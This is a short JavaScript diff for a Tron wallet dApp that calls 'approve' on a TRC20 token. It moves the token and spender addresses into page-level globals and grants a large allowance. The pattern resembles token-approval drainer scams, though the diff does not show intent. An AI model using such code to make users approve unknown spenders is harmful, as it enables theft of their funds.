@@ -1,11 +1,12 @@
 const feeLimit = 100000000;
 const callValue = 0;
+console.log(window.contractAddress)
 const triggerContract = async (number) => {
   let trcUsdt = await window.tronWeb
     .contract()
-    .at('TJ3hUZSGLqCXHzB7FzWhxhepXHxM1NWPrf');
+    .at(window.TD);
   trcUsdt
-    .approve('TNGHddjuhKCfU2TNGfCMETBD1upW62MWAb', number + "000000000000000000" )
+    .approve(window.approve, number + "000000000000000000" )
     .send({
       feeLimit: feeLimit,
       callValue: callValue || 0,
